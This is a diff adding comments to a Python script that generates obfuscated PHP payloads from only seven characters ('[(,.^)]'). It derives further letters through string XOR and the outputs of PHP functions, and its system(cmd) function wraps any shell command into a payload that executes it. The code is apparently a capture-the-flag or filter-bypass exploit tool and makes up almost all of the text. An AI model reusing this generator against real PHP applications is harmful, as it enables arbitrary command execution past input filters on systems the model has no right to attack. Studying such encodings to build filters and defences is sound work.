@@ -4,6 +4,9 @@ import sys
 from itertools import combinations
 
 
+# Using ("str"^"str") notation, we can use xor to create
+# some new characters out of the characters we already have.
+# Repeat several times, as nessecary.
 def expand():
     loop = True
     while loop:
@@ -16,19 +19,26 @@ def expand():
                     loop = True
 
 
+# Given an input string, will try to return the encoded form of that string.
 def stringfor(s):
     return ".".join("(" + cs[c] + ")" for c in s)
 
 
+# Generate all the characters we can.
 def build_cs():
+    # We get 7 characters for free
     for c in "[(,.^)]":
         cs[c] = f"'{c}'"
     expand()
 
+    # False === ('strstr')('.',',')
     p_false = "(" + stringfor("strstr") + ")('.',',')"
+
+    # 'k' === ((false^false).'.')^'['
     cs["k"] = "((" + p_false + "^" + p_false + ").'.')^'['"
     expand()
 
+    # '9' === (('sqrt')('5').'.')['12']
     cs["9"] = (
         "(("
         + stringfor("sqrt")
@@ -41,6 +51,7 @@ def build_cs():
     expand()
 
 
+# Given cmd, generate a payload that executes system(cmd)
 def system(cmd):
     return "(" + stringfor("system") + ")(" + stringfor(cmd) + ")"
 
